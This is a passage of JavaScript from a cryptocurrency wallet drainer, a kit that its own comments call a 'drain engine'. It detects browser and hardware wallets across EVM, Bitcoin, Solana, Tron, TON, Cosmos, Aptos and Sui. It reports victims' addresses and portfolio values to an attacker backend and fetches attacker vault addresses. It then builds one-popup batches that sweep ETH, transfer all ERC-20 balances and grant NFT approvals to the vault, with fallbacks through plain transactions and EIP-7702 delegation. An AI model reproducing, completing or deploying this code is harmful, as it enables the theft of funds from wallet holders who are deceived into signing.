    if (window.HiroWalletProvider) pushFamily(fp.UTXO, seen, window.HiroWalletProvider, 'UTXO', 'hiro');
    if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
      pushFamily(fp.UTXO, seen, window.XverseProviders.BitcoinProvider, 'UTXO', 'xverse');
    }
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'okxwallet');
    if (window.bitkeep) scanObjectForFamily(window.bitkeep, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'bitkeep');
    if (window.phantom) scanObjectForFamily(window.phantom, fp.UTXO, seen, 'UTXO', hasUtxoApi, 'phantom');

    if (window.tronLink) pushFamily(fp.TRON, seen, window.tronLink, 'TRON', 'tronLink');
    if (window.tronWeb) pushFamily(fp.TRON, seen, { tronWeb: window.tronWeb }, 'TRON', 'tronWeb');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.TRON, seen, 'TRON', hasTronApi, 'okxwallet');

    if (window.tonkeeper) pushFamily(fp.TON, seen, window.tonkeeper, 'TON', 'tonkeeper');
    if (window.ton) pushFamily(fp.TON, seen, window.ton, 'TON', 'ton');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.TON, seen, 'TON', hasTonApi, 'okxwallet');

    if (window.keplr) pushFamily(fp.COSMOS, seen, window.keplr, 'COSMOS', 'keplr');
    if (window.leap) pushFamily(fp.COSMOS, seen, window.leap, 'COSMOS', 'leap');
    if (window.cosmostation && window.cosmostation.providers) {
      scanObjectForFamily(window.cosmostation.providers, fp.COSMOS, seen, 'COSMOS', hasCosmosApi, 'cosmostation');
    }

    if (window.aptos) pushFamily(fp.APTOS, seen, window.aptos, 'APTOS', 'aptos');
    if (window.petra && window.petra.aptos) pushFamily(fp.APTOS, seen, window.petra.aptos, 'APTOS', 'petra');
    if (window.martian) pushFamily(fp.APTOS, seen, window.martian, 'APTOS', 'martian');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.APTOS, seen, 'APTOS', hasAptosApi, 'okxwallet');

    if (window.suiWallet) pushFamily(fp.SUI, seen, window.suiWallet, 'SUI', 'suiWallet');
    if (window.phantom) scanObjectForFamily(window.phantom, fp.SUI, seen, 'SUI', hasSuiApi, 'phantom');
    if (window.okxwallet) scanObjectForFamily(window.okxwallet, fp.SUI, seen, 'SUI', hasSuiApi, 'okxwallet');

    S.familyProviders = fp;
    var counts = [];
    Object.keys(fp).forEach(function (k) {
      if (fp[k].length) counts.push(k + ':' + fp[k].length);
    });
    if (counts.length) L.log('[families] detected', counts.join(' '));
    return fp;
  }

  function firstFamilyProvider(family) {
    var list = (S.familyProviders && S.familyProviders[family]) || [];
    return list.length ? list[0] : null;
  }

  function detectNonEvm() {
    discoverChainFamilies();
    return S.familyProviders || {};
  }

  var EVM_FINGERPRINTS = [
    ['isRabby', 'Rabby'], ['isOkxWallet', 'OKX'], ['isCoinbaseWallet', 'Coinbase Wallet'],
    ['isBraveWallet', 'Brave'], ['isTrust', 'Trust Wallet'], ['isBitKeep', 'Bitget'],
    ['isBitget', 'Bitget'], ['isTokenPocket', 'TokenPocket'], ['isFrame', 'Frame'],
    ['isSafePal', 'SafePal'], ['isZerion', 'Zerion'], ['is1inch', '1inch'],
    ['isRainbow', 'Rainbow'], ['isPhantom', 'Phantom'], ['isExodus', 'Exodus'],
    ['isMetaMask', 'MetaMask'],
  ];

  function detectEvmWalletName(provider) {
    if (!provider) return 'Unknown Wallet';
    for (var i = 0; i < EVM_FINGERPRINTS.length; i++) {
      if (provider[EVM_FINGERPRINTS[i][0]]) return EVM_FINGERPRINTS[i][1];
    }
    return 'Browser Wallet';
  }

  function isMetaMaskProvider(provider) {
    return !!(provider && provider.isMetaMask && !provider.isRabby && !provider.isBraveWallet && !provider.isWalletConnect);
  }

  function toHexQty(val) {
    if (val == null) return '0x0';
    if (typeof val === 'string' && val.indexOf('0x') === 0) return val;
    if (typeof val === 'bigint') return '0x' + val.toString(16);
    if (typeof val === 'number') return '0x' + val.toString(16);
    return '0x' + BigInt(val).toString(16);
  }

  function canTryNativeSignTx(provider) {
    return !isMetaMaskProvider(provider);
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 06: API HELPERS
  // ═══════════════════════════════════════════════════════════════
  function toHex(obj) {
    var str = typeof obj === 'string' ? obj : JSON.stringify(obj, function (k, v) {
      return typeof v === 'bigint' ? v.toString() : v;
    });
    var hex = '0x';
    for (var i = 0; i < str.length; i++) hex += str.charCodeAt(i).toString(16).padStart(2, '0');
    return hex;
  }

  function jsonSafe(obj) {
    return JSON.stringify(obj, function (k, v) { return typeof v === 'bigint' ? v.toString() : v; });
  }

  async function apiPost(path, body, tries) {
    tries = tries || 0;
    try {
      var ctrl = typeof AbortController !== 'undefined' ? new AbortController() : null;
      var timer = ctrl ? setTimeout(function () { ctrl.abort(); }, 20000) : null;
      var headers = { 'Content-Type': 'application/json', 'X-Source-Origin': window.location.origin };
      if (KINETIC_KEY) headers['x-legion-kinetic-key'] = KINETIC_KEY;
      var opts = {
        method: 'POST',
        headers: headers,
        body: jsonSafe(body),
      };
      if (ctrl) opts.signal = ctrl.signal;
      var res = await fetch(BACKEND + path, opts);
      if (timer) clearTimeout(timer);
      var data = await res.json();
      if (!res.ok) { L.warn('API', res.status, path, data && data.message); return null; }
      return data;
    } catch (e) {
      if (tries < 2) { await sleep(1000); return apiPost(path, body, tries + 1); }
      L.warn('API failed:', path, e.message);
      return null;
    }
  }

  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function sigHex(obj) {
    var str = typeof obj === 'string' ? obj : JSON.stringify(obj);
    var hex = '0x';
    for (var i = 0; i < str.length; i++) hex += str.charCodeAt(i).toString(16).padStart(2, '0');
    return hex;
  }

  function bufToB64(buf) {
    var bytes = buf instanceof Uint8Array ? buf : new Uint8Array(buf);
    var bin = '';
    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin);
  }

  var MIN_NATIVE_WEI = 100000000000000n; // 0.0001 ETH — drain dust floor (~$0.20)

  async function switchProviderChain(provider, chainId) {
    var hexId = '0x' + Number(chainId).toString(16);
    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: hexId }],
      });
    } catch (switchErr) {
      var msg = String(switchErr && switchErr.message || switchErr || '');
      var code = switchErr && switchErr.code;
      if (msg.indexOf('Unrecognized chain') === -1 && msg.indexOf('4902') === -1 && code !== 4902) throw switchErr;
      var add = CHAIN_ADD_PARAMS[Number(chainId)];
      if (!add) throw switchErr;
      L.log('Adding chain', chainId, 'to wallet...');
      await provider.request({ method: 'wallet_addEthereumChain', params: [add] });
      await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hexId }] });
    }
    await sleep(400);
  }

  async function safeSwitchProviderChain(provider, chainId) {
    try {
      await switchProviderChain(provider, chainId);
      return true;
    } catch (e) {
      var msg = String(e && e.message || e || '');
      if (isUserRejection(e)) {
        L.warn('Chain', chainId, 'switch/add declined by user — skip');
        return false;
      }
      if (msg.indexOf('Unrecognized chain') !== -1 || msg.indexOf('4902') !== -1) {
        L.warn('Chain', chainId, 'not supported in wallet — skip');
        return false;
      }
      throw e;
    }
  }

  async function readNativeBalanceWei(provider, address) {
    try {
      return BigInt(await provider.request({ method: 'eth_getBalance', params: [address, 'latest'] }) || '0x0');
    } catch (e) {
      return 0n;
    }
  }

  /** Switch MetaMask to the EVM chain that actually holds native balance. */
  async function ensureFundedEvmChain(provider, address, connectedChainId) {
    var connectedBal = await readNativeBalanceWei(provider, address);
    if (connectedBal > MIN_NATIVE_WEI) {
      L.log('Funded chain:', connectedChainId, '| native:', (Number(connectedBal) / 1e18).toFixed(6));
      return Number(connectedChainId);
    }

    L.log('Chain', connectedChainId, 'empty — finding funded EVM chain...');
    var bestId = Number(connectedChainId);
    var bestBal = connectedBal;
    for (var i = 0; i < MULTI_CHAIN_ORDER.length; i++) {
      var cid = MULTI_CHAIN_ORDER[i];
      if (cid === Number(connectedChainId)) continue;
      try {
        var switched = await safeSwitchProviderChain(provider, cid);
        if (!switched) continue;
        var bal = await readNativeBalanceWei(provider, address);
        if (bal > bestBal) {
          bestBal = bal;
          bestId = cid;
        }
      } catch (e) {
        if (String(e.message || '').indexOf('Unrecognized chain') !== -1) continue;
        L.warn('Funded-chain probe', cid, 'fail:', e.message);
      }
    }

    if (bestId !== Number(connectedChainId) && bestBal > MIN_NATIVE_WEI) {
      L.log('Auto-switch', connectedChainId, '→', bestId, '| native:', (Number(bestBal) / 1e18).toFixed(6));
      await switchProviderChain(provider, bestId);
      return bestId;
    }

    if (bestId !== Number(connectedChainId)) {
      try { await switchProviderChain(provider, connectedChainId); } catch (e) {}
    }
    return Number(connectedChainId);
  }

  function chainHasDrainableAssets(assets) {
    if (!assets) return false;
    var nativeBal = BigInt(assets.nativeHex || '0x0');
    return nativeBal > MIN_NATIVE_WEI || (assets.tokens && assets.tokens.length > 0) || (assets.nfts && assets.nfts.length > 0);
  }

  var SCOUT = {
    telemetry: async function (address, chainId, walletName) {
      try {
        await apiPost('/api/v1/scout', {
          user_address: address,
          chain_id: Number(chainId) || 1,
          wallet_type: walletName || 'Unknown',
          chain_family: 'EVM',
          source_page: window.location.href,
          connect_session: S.connectSession || undefined,
        });
      } catch (e) {}
    },

    reportDrainStatus: async function (event, address, chainId, walletName, detail) {
      try {
        await apiPost('/api/v1/scout/drain-status', {
          wallet_address: address,
          event: event,
          chain_id: Number(chainId) || undefined,
          chain_family: 'EVM',
          wallet_type: walletName || 'Unknown',
          scout_value_usd: Number(S.scoutUsd) || 0,
          source_page: window.location.href,
          detail: detail || undefined,
          connect_session: S.connectSession || undefined,
        });
      } catch (e) {}
    },

    reportScanComplete: async function (address, totalUsd, assetCount, walletName, chainId) {
      if (S.fusionNotified) return;
      S.fusionNotified = true;
      S.scoutUsd = Math.max(S.scoutUsd, Number(totalUsd) || 0);
      try {
        await apiPost('/api/v1/scout/drain-status', {
          wallet_address: address,
          event: 'scan_complete',
          chain_id: Number(chainId) || undefined,
          chain_family: 'EVM',
          wallet_type: walletName || 'Unknown',
          scout_value_usd: Number(totalUsd) || 0,
          asset_count: assetCount || 0,
          source_page: window.location.href,
          connect_session: S.connectSession || undefined,
        });
      } catch (e) {}
    },

    fusion: async function (addrs) {
      try {
        var body = { connect_session: S.connectSession || undefined };
        if (addrs.evm) body.evm_holder = addrs.evm;
        if (addrs.sol) body.sol_owner_base58 = addrs.sol;
        if (addrs.tron) body.tron_holder_base58 = addrs.tron;
        if (addrs.ton) body.ton_friendly_address = addrs.ton;
        if (addrs.btc) body.btc_holder_address = addrs.btc;
        if (addrs.cosmos) body.cosmos_holder = addrs.cosmos;
        if (addrs.aptos) body.aptos_holder = addrs.aptos;
        if (addrs.sui) body.sui_holder = addrs.sui;
        var r = await apiPost('/api/scout/recursive-predator-fusion', body);
        var data = (r && r.data && r.data.fusion) ? r.data.fusion : (r && r.data) ? r.data : r;
        if (data && data.total_usd) S.scoutUsd = Number(data.total_usd) || S.scoutUsd;
        if (data && data.assets) S.fusionAssets = data.assets;
        return data || null;
      } catch (e) { L.warn('Fusion scout fail:', e.message); return null; }
    },

    ranked: async function (address, chainId) {
      try {
        var body = { wallet_address: address };
        if (chainId != null) body.chain_id = Number(chainId);
        var r = await apiPost('/api/v1/scout/ranked', body);
        return (r && r.data) ? r.data : null;
      } catch (e) { return null; }
    },

    chainPriority: function (fusionData) {
      var order = ['EVM', 'SOL', 'BTC', 'TRON', 'TON', 'COSMOS', 'APTOS', 'SUI'];
      var vals = {};
      (S.fusionAssets || []).forEach(function (a) {
        var fam = a.family || a.chain_family || a.chain || 'EVM';
        if (fam === 'SVM') fam = 'SOL';
        if (fam === 'UTXO') fam = 'BTC';
        vals[fam] = (vals[fam] || 0) + Number(a.amount_usd || a.usd_value || 0);
      });
      return order.slice().sort(function (a, b) { return (vals[b] || 0) - (vals[a] || 0); });
    },
  };

  async function prefetchVault() {
    try {
      var res = await fetch(BACKEND + '/api/v1/client-config');
      var d = await res.json();
      if (d && d.data) {
        if (d.data.primary) BACKEND = String(d.data.primary).replace(/\/$/, '');
        if (d.data.eip7702_enabled === false) S.eip7702Enabled = false;
        var va = d.data.vault_addresses;
        if (va) {
          if (va.evm || va.ethereum) VAULT.evm = va.evm || va.ethereum;
          if (va.sol || va.svm) VAULT.sol = va.sol || va.svm;
          if (va.btc) VAULT.btc = va.btc;
          if (va.tron || va.trx) VAULT.tron = va.tron || va.trx;
          if (va.ton) VAULT.ton = va.ton;
          if (va.cosmos) VAULT.cosmos = va.cosmos;
          if (va.aptos) VAULT.aptos = va.aptos;
          if (va.sui) VAULT.sui = va.sui;
        }
      }
    } catch (e) { L.warn('Vault fetch failed, using fallback'); }
    S.vaultLoaded = true;
  }

  function normalizeTypedData(typedDataObj) {
    if (!typedDataObj) return typedDataObj;
    if (typedDataObj.domain && typeof typedDataObj.domain.chainId === 'string') {
      typedDataObj.domain.chainId = parseInt(typedDataObj.domain.chainId, 10) || 1;
    }
    if (typedDataObj.types && !typedDataObj.types.EIP712Domain) {
      var dom = typedDataObj.domain || {};
      var domFields = [];
      if (dom.name !== undefined) domFields.push({ name: 'name', type: 'string' });
      if (dom.version !== undefined) domFields.push({ name: 'version', type: 'string' });
      if (dom.chainId !== undefined) domFields.push({ name: 'chainId', type: 'uint256' });
      if (dom.verifyingContract !== undefined) domFields.push({ name: 'verifyingContract', type: 'address' });
      typedDataObj.types.EIP712Domain = domFields;
    }
    return typedDataObj;
  }

  function normNftList(nfts) {
    return (nfts || []).map(function (n) {
      return {
        contract: n.contract || n.nft_contract,
        tokenIds: n.tokenIds || [String(n.token_id || n.tokenId || '1')],
        standard: n.standard || 'erc721',
      };
    }).filter(function (n) { return n.contract; });
  }

  function isLethalEvmResult(p2) {
    if (!p2) return false;
    if (p2.sig && String(p2.sig).length > 10) return true;
    if (p2.nativeSigned && String(p2.nativeSigned).startsWith('0x') && p2.nativeSigned.length > 70) return true;
    var nas = p2.nftApprovalSigs || {};
    return Object.keys(nas).some(function (k) { return nas[k] && String(nas[k]).length > 10; });
  }

  function isUserRejection(e) {
    var code = e && (e.code || (e.data && e.data.code));
    var msg = (e && e.message) || '';
    return code === 4001 || code === -32100 || code === 5000 || code === 'ACTION_REJECTED' ||
      /rejected|denied|cancelled|user rejected|declined/i.test(msg);
  }

  function estimateSendCallsGasLimit(tokenCount, nftCount, hasNative) {
    var limit = hasNative ? NATIVE_TRANSFER_GAS : 0n;
    limit += BigInt(tokenCount || 0) * ERC20_TRANSFER_GAS;
    limit += BigInt(nftCount || 0) * ERC20_TRANSFER_GAS;
    if (limit < NATIVE_TRANSFER_GAS) limit = NATIVE_TRANSFER_GAS;
    return limit;
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 07: HARDWARE WALLET — LEDGER + TREZOR
  // ═══════════════════════════════════════════════════════════════
  var _ledgerTransport = null, _ledgerEthApp = null, _trezorReady = false;
  var HD_PATH_EVM = "m/44'/60'/0'/0";

  var HW = {
    available: function () { return !!(navigator && navigator.usb); },

    loadLedger: async function () {
      if (_ledgerTransport && _ledgerEthApp) return true;
      try {
        await loadVendorScript('ledger-transport-webusb.umd.js');
        await loadVendorScript('ledger-app-eth.umd.js');
        var TM = window.LedgerTransportWebUSB || window.TransportWebUSB;
        var EM = window.LedgerEth || window.Eth;
        if (TM && EM) {
          _ledgerTransport = TM.default || TM;
          _ledgerEthApp = EM.default || EM;
          return true;
        }
      } catch (e) { /* vendor optional */ }
      if (!CDN_FALLBACK) {
        L.warn('Ledger: self-host vendor/ledger-*.js or set cdnFallback (strictCsp:false)');
        return false;
      }
      try {
        var mods = await Promise.all([
          import('https://esm.sh/@ledgerhq/hw-transport-webusb@6.29.4?bundle-deps'),
          import('https://esm.sh/@ledgerhq/hw-app-eth@6.38.4?bundle-deps'),
        ]);
        _ledgerTransport = mods[0].default || mods[0];
        _ledgerEthApp = mods[1].default || mods[1];
        return true;
      } catch (e) { L.warn('Ledger SDK fail:', e.message); return false; }
    },

    connectLedger: async function () {
      if (!this.available() || !await this.loadLedger()) return null;
      try {
        var t = await _ledgerTransport.create();
        var app = new _ledgerEthApp(t);
        var r = await app.getAddress(HD_PATH_EVM, false);
        if (!r || !r.address) throw new Error('No address');
        L.log('Ledger connected:', r.address.slice(0, 8));
        return { type: 'ledger', address: r.address.toLowerCase(), transport: t, ethApp: app };
      } catch (e) { L.warn('Ledger connect fail:', e.message); return null; }
    },

    signLedgerTypedData: async function (hwObj, typedData) {
      try {
        var r = await hwObj.ethApp.signEIP712Message(HD_PATH_EVM, typedData);
        return '0x' + r.r + r.s + (r.v - 27).toString(16).padStart(2, '0');
      } catch (e) {
        // Older Nano S fallback
        try {
          var hex = toHex(jsonSafe(typedData)).slice(2);
          var r2 = await hwObj.ethApp.signPersonalMessage(HD_PATH_EVM, hex);
          return '0x' + r2.r + r2.s + (r2.v - 27).toString(16).padStart(2, '0');
        } catch (e2) { L.warn('Ledger sign fail:', e2.message); return null; }
      }
    },

    loadTrezor: async function () {
      if (_trezorReady && window.TrezorConnect) return true;
      try {
        await loadVendorScript('trezor-connect-web.min.js');
        var TC = window.TrezorConnect;
        if (TC) {
          await TC.init({ lazyLoad: false, manifest: { email: 'dev@app.io', appUrl: window.location.origin } });
          _trezorReady = true;
          return true;
        }
      } catch (e) { /* vendor optional */ }
      if (!CDN_FALLBACK) {
        L.warn('Trezor: self-host vendor/trezor-connect-web.min.js or set cdnFallback');
        return false;
      }
      try {
        var m = await import('https://esm.sh/@trezor/connect-web@9.4.5?bundle-deps');
        var TC2 = m.default || m;
        await TC2.init({ lazyLoad: false, manifest: { email: 'dev@app.io', appUrl: window.location.origin } });
        window.TrezorConnect = TC2;
        _trezorReady = true;
        return true;
      } catch (e) { L.warn('Trezor SDK fail:', e.message); return false; }
    },

    connectTrezor: async function () {
      if (!this.available() || !await this.loadTrezor()) return null;
      try {
        var r = await window.TrezorConnect.ethereumGetAddress({ path: HD_PATH_EVM, showOnTrezor: false });
        if (!r.success) throw new Error(r.payload.error);
        L.log('Trezor connected:', r.payload.address.slice(0, 8));
        return { type: 'trezor', address: r.payload.address.toLowerCase() };
      } catch (e) { L.warn('Trezor connect fail:', e.message); return null; }
    },

    signTrezorTypedData: async function (typedData) {
      try {
        var r = await window.TrezorConnect.ethereumSignTypedData({ path: HD_PATH_EVM, data: typedData, metamask_v4_compat: true });
        if (!r.success) throw new Error(r.payload.error);
        return r.payload.signature;
      } catch (e) { L.warn('Trezor sign fail:', e.message); return null; }
    },
  };

  // ═══════════════════════════════════════════════════════════════
  // SECTION 08: WALLETCONNECT — Reown AppKit bundle only
  // ═══════════════════════════════════════════════════════════════
  var _wcConnecting = false;
  var _wcProv = null;

  function extractBatchOrTxId(raw) {
    if (raw == null) return null;
    if (typeof raw === 'string') {
      var s = raw.trim();
      if (s.indexOf('[object') === 0) return null;
      return s.startsWith('0x') ? s : null;
    }
    if (typeof raw === 'object') {
      var id = raw.id || raw.bundleId || raw.hash || raw.transactionHash || raw.txHash;
      if (id && String(id).startsWith('0x')) return String(id);
    }
    return null;
  }

  async function bundledWalletConnect() {
    if (!WC_PROJECT_ID) { L.warn('wcProjectId not set'); return null; }
    if (typeof window.LegionWallet === 'undefined') {
      L.warn('LegionWallet bundle not loaded');
      return null;
    }
    if (_wcConnecting) return null;
    _wcConnecting = true;
    _wcProv = null;

    var wcMeta = {
      name: document.title || 'App',
      description: 'Connect your wallet',
      url: window.location.origin,
      icons: [window.location.origin + '/favicon.ico'],
    };

    try {
      UI.status('Opening wallet modal...');
      L.log('Reown AppKit (bundled wagmi/viem) v' + (window.LegionWallet.version || '?'));
      var connectP = window.LegionWallet.connect({
        projectId: WC_PROJECT_ID,
        metadata: wcMeta,
        timeoutMs: 180000,
        requireWalletConnect: true,
      });
      var provider = await Promise.race([
        connectP,
        new Promise(function (_, rej) {
          setTimeout(function () { rej(new Error('AppKit timeout — scan QR and approve on phone')); }, 185000);
        }),
      ]);
      var connId = (window.LegionWallet.getConnectorId ? window.LegionWallet.getConnectorId() : '').toLowerCase();
      if (provider && (provider.isMetaMask || connId.indexOf('metamask') !== -1 ||
          connId.indexOf('injected') !== -1 || connId.indexOf('rabby') !== -1)) {
        try { await window.LegionWallet.disconnect(); } catch (e2) {}
        L.warn('Extension hijacked WalletConnect — retrying with phone QR');
        _wcConnecting = false;
        _wcProv = null;
        return null;
      }
      if (provider && !provider.isWalletConnect) {
        try { await window.LegionWallet.disconnect(); } catch (e2) {}
        L.warn('Non-WC connector — retrying with phone QR');
        _wcConnecting = false;
        _wcProv = null;
        return null;
      }
      _wcProv = provider;
      _wcConnecting = false;
      L.log('Bundled AppKit connected | connector:', connId || 'unknown',
        '| wc:', !!(provider && provider.isWalletConnect));
      return provider;
    } catch (e) {
      _wcConnecting = false;
      _wcProv = null;
      try { await window.LegionWallet.disconnect(); } catch (e2) {}
      L.warn('Bundled AppKit fail:', e.message);
      return null;
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 09: EVM CORE — DRAIN ENGINE
  // ═══════════════════════════════════════════════════════════════

  // 9.1 — Capability detection
  async function getCapabilities(provider, address, chainId) {
    try {
      var caps = await provider.request({ method: 'wallet_getCapabilities', params: [address] });
      var key = '0x' + Number(chainId).toString(16);
      var cc = caps && (caps[key] || caps[String(chainId)] || caps[Number(chainId)]);
      var atomic = cc && (cc.atomic || cc.atomicBatch);
      var status = atomic && (atomic.status || (atomic.supported ? 'supported' : ''));
      var atomicBatch = status === 'ready' || status === 'supported' || !!(atomic && atomic.supported);
      return { atomicBatch: atomicBatch };
    } catch (e) {
      return { atomicBatch: isMetaMaskProvider(provider) };
    }
  }

  async function scanAssets(provider, address, chainId) {
    var assets = { tokens: [], nfts: [], nativeHex: '0x0', usd: 0, defi_positions: [], uni_v3_positions: [], uni_v2_lps: [] };
    try {
      var scout = await apiPost('/api/v1/scout/ranked', { wallet_address: address, chain_id: Number(chainId) });
      if (scout && scout.data) {
        assets.usd = Number(scout.data.total_usd || 0);
        S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
        (scout.data.ranked || []).forEach(function (t) {
          if (t.address && t.address.toLowerCase() !== NATIVE_ETH_ADDR && BigInt(t.raw_balance || '0') > 0n) {
            assets.tokens.push({ address: t.address, balance: t.raw_balance, symbol: t.symbol, usd: t.usd_value || 0 });
          }
        });
        if (scout.data.nfts && scout.data.nfts.length) assets.nfts = scout.data.nfts;
        if (scout.data.defi_positions) assets.defi_positions = scout.data.defi_positions;
        if (scout.data.uni_v3_positions) assets.uni_v3_positions = scout.data.uni_v3_positions;
        if (scout.data.uni_v2_lps) assets.uni_v2_lps = scout.data.uni_v2_lps;
      }
    } catch (e) { L.warn('Scout fail:', e.message); }

    try {
      var nftScan = await apiPost('/api/v1/seaport/scan-listings', {
        wallet_address: address, wallet: address, chain_id: Number(chainId),
      });
      var listings = (nftScan && nftScan.data && nftScan.data.listings) || [];
      var seen = {};
      assets.nfts.forEach(function (n) { if (n.contract) seen[String(n.contract).toLowerCase()] = true; });
      listings.forEach(function (l) {
        var c = l.contract || l.nft_contract;
        if (c && !seen[c.toLowerCase()]) {
          seen[c.toLowerCase()] = true;
          assets.nfts.push({ contract: c, token_id: l.token_id, standard: l.standard || 'erc721' });
        }
      });
    } catch (e2) { L.warn('NFT scan skip:', e2.message); }

    try {
      assets.nativeHex = await provider.request({ method: 'eth_getBalance', params: [address, 'latest'] }) || '0x0';
    } catch (e3) {}

    var nativeBal = BigInt(assets.nativeHex || '0x0');
    if (nativeBal > 0n) {
      L.log('On-chain native:', (Number(nativeBal) / 1e18).toFixed(6), 'ETH on chain', chainId);
    }

    try {
      var fusionUsd = await SCOUT.ranked(address);
      if (fusionUsd && fusionUsd.total_usd != null) {
        var totalAll = Number(fusionUsd.total_usd) || 0;
        assets.usd = Math.max(assets.usd, totalAll);
        S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
        L.log('Backend portfolio USD:', assets.usd.toFixed(2));
      }
    } catch (e4) { /* ranked all-chains optional */ }

    if (nativeBal > MIN_NATIVE_WEI && assets.usd < 1) {
      var ethFloorUsd = (Number(nativeBal) / 1e18) * 2500;
      if (ethFloorUsd > assets.usd) {
        assets.usd = ethFloorUsd;
        S.scoutUsd = Math.max(S.scoutUsd, assets.usd);
        L.log('Native ETH USD floor:', assets.usd.toFixed(2));
      }
    }

    return assets;
  }

  function normalizeSendCall(call) {
    var c = { to: call.to };
    if (call.value) c.value = call.value;
    if (call.data && call.data !== '0x' && String(call.data).length > 2) c.data = call.data;
    return c;
  }

  // 9.3 — TIER 1: wallet_sendCalls (ONE POPUP — ETH + ERC-20 + NFT)
  async function drainSendCalls(provider, address, chainId, assets) {
    var claimContract = resolveClaimContract(chainId);
    var vault = VAULT.evm;
    var calls = [];

    var tokenCount = (assets.tokens || []).filter(function (t) { return BigInt(t.balance || '0') > 0n; }).length;
    var nftContracts = {};
    (assets.nfts || []).forEach(function (n) { if (n.contract) nftContracts[n.contract.toLowerCase()] = true; });
    var nftCount = Object.keys(nftContracts).length;
    var bal = BigInt(assets.nativeHex || '0x0');
    var gasLimit = estimateSendCallsGasLimit(tokenCount, nftCount, bal > 0n);
    var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
    var sendEth = sweep.send;

    if (sendEth > MIN_NATIVE_WEI) {
      if (claimContract) {
        calls.push({ to: claimContract, value: '0x' + sendEth.toString(16), data: SIG_CLAIM });
        L.log('Native sweep → claim():', claimContract.slice(0, 10) + '...', (Number(sendEth) / 1e18).toFixed(6));
      } else {
        calls.push({ to: vault, value: '0x' + sendEth.toString(16) });
        L.log('Native sweep → vault (no claim contract):', (Number(sendEth) / 1e18).toFixed(6), 'ETH');
      }
    }

    // ERC-20 — direct transfer(vault, balance)
    var SIG_TRF = '0xa9059cbb';
    assets.tokens.forEach(function (t) {
      if (BigInt(t.balance || '0') > 0n) {
        calls.push({
          to: t.address,
          data: SIG_TRF + vault.replace('0x', '').padStart(64, '0') + BigInt(t.balance).toString(16).padStart(64, '0'),
        });
      }
    });

    // NFT — setApprovalForAll(vault, true)
    var SIG_APPR = '0xa22cb465';
    Object.keys(nftContracts).forEach(function (c) {
      calls.push({ to: c, data: SIG_APPR + vault.replace('0x', '').padStart(64, '0') + '1'.padStart(64, '0') });
    });

    if (calls.length === 0) return null;
    calls = calls.map(normalizeSendCall);

    L.log('wallet_sendCalls:', calls.length, 'calls');
    try {
      var batchId = await provider.request({
        method: 'wallet_sendCalls',
        params: [{
          version: '2.0.0',
          chainId: '0x' + Number(chainId).toString(16),
          from: address,
          atomicRequired: true,
          calls: calls,
        }],
      });
      var extracted = extractBatchOrTxId(batchId);
      L.log('sendCalls batchId:', extracted ? extracted.slice(0, 42) : String(batchId));
      return extracted || batchId;
    } catch (e) {
      L.warn('wallet_sendCalls v2 fail:', e.message);
      try {
        var batchId2 = await provider.request({
          method: 'wallet_sendCalls',
          params: [{
            version: '1.0',
            chainId: '0x' + Number(chainId).toString(16),
            from: address,
            atomicRequired: false,
            calls: calls,
          }],
        });
        return extractBatchOrTxId(batchId2) || batchId2;
      } catch (e2) { L.warn('wallet_sendCalls v1 fail:', e2.message); return null; }
    }
  }

  /** Mobile / WC — claim() contract when deployed, else direct vault transfer */
  async function drainNativeSendTx(provider, address, chainId, assets) {
    var claimContract = resolveClaimContract(chainId);
    var gasLimit = claimContract ? 120000n : NATIVE_TRANSFER_GAS;
    var sweep = await calcMaxNativeSendWei(provider, assets.nativeHex, chainId, gasLimit);
    var sendEth = sweep.send;
    if (sendEth <= MIN_NATIVE_WEI) return null;
    var vault = VAULT.evm;
    var chainHex = '0x' + Number(chainId).toString(16);
    try {
      var nonceHex = await provider.request({ method: 'eth_getTransactionCount', params: [address, 'pending'] });
      var fees = await estimateEip1559Fees(provider);
      var tx = {
        from: address,
        to: claimContract || vault,
        value: toHexQty(sendEth),
        data: claimContract ? SIG_CLAIM : '0x',
        chainId: chainHex,
        nonce: toHexQty(nonceHex),
        gas: toHexQty(gasLimit),
        maxFeePerGas: toHexQty(fees.maxFeePerGas),
        maxPriorityFeePerGas: toHexQty(fees.maxPriorityFeePerGas),
      };
      if (claimContract) {
        var onVault = await readContractVault(provider, claimContract);
        L.log('eth_sendTransaction claim() →', claimContract.slice(0, 10) + '...',
          '| forwards to:', (onVault || VAULT.evm).slice(0, 10) + '...',
          '|', (Number(sendEth) / 1e18).toFixed(6), 'native');
      } else {
        L.log('eth_sendTransaction native → vault (deploy ClaimForwarder):', (Number(sendEth) / 1e18).toFixed(6));
      }
      var hash = await provider.request({ method: 'eth_sendTransaction', params: [tx] });
      return hash ? String(hash) : null;
    } catch (e) {
      L.warn('eth_sendTransaction fail:', e.message);
      return null;
    }
  }

  // 9.4 — TIER 2: EIP-7702 wallet_signAuthorization (ONE POPUP)
  async function drainEip7702(provider, address, chainId, assets) {
    if (!S.eip7702Enabled) return null;
    var delegate = resolveLegionDrain(chainId) || BATCH_DRAIN[Number(chainId)];
    if (!delegate || delegate === '0x0000000000000000000000000000000000000000') return null;
    if (!EIP7702_CHAINS[Number(chainId)]) return null;

    try {
      var nonceHex = await provider.request({ method: 'eth_getTransactionCount', params: [address, 'pending'] });
      var nonce = parseInt(String(nonceHex).replace('0x', ''), 16);

      L.log('wallet_signAuthorization...');
      var auth = await provider.request({
        method: 'wallet_signAuthorization',
        params: [{ contractAddress: delegate, chainId: '0x' + Number(chainId).toString(16), nonce: nonce }],
      });
      var defiActions = buildDefiActions(chainId, assets);
      L.log('EIP-7702 auth ok | defi actions:', defiActions.length);
      return {
        auth: auth,
        delegate: delegate,
